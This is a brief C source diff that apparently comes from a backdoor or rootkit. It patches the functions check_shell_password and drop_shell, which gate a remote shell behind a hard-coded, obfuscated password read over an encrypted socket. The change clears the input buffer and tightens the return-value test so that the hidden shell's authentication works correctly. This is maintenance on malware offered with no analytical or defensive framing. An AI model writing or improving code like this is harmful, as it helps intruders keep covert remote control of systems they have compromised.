@@ -722,7 +722,7 @@ int check_shell_password(int sock, int crypt) {
 	char buffer[512];
 	char *shell_passwd = strdup(SHELL_PASSWD);
 	x(shell_passwd);
-	
+	memset(buffer, 0x00, sizeof(buffer));
 	if (crypt) {
 		crypt_read(sock,buffer,sizeof(buffer)-1);
 		if (strstr(buffer, shell_passwd)) {
@@ -771,7 +771,7 @@ int drop_shell(int sock, struct sockaddr *addr) {
 	 } else
 		return sock;
 	
-	if(!check_shell_password(sock, crypt_mode)) {
+	if(check_shell_password(sock, crypt_mode) != 1) {
 		shutdown(sock, SHUT_RDWR);
 		close(sock);
 		return -1;
